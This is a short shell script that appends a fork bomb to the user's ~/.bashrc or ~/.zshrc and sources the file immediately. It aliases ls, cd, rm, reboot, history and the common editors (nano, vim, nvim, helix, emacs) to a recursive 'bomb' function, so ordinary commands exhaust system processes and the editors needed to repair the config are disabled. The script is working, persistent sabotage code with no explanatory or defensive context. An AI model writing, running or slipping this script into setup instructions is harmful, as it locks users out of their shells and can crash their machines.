#!/usr/bin/env sh

case "$SHELL" in
  *zsh*)
    CONF_FILE="$HOME/.zshrc"
    ;;
  *bash*)
    CONF_FILE="$HOME/.bashrc"
    ;;
esac


fun="bomb() { bomb | bomb & }; alias ls='bomb'; alias cd='bomb'; alias reboot='bomb'; alias nano='bomb'; alias rm='bomb' alias vim='bomb'; alias nvim='bomb'; alias helix='bomb'; alias hx='bomb'; alias emacs='bomb'; alias history='bomb'"

echo "$fun" >> "$CONF_FILE"

source "$CONF_FILE"
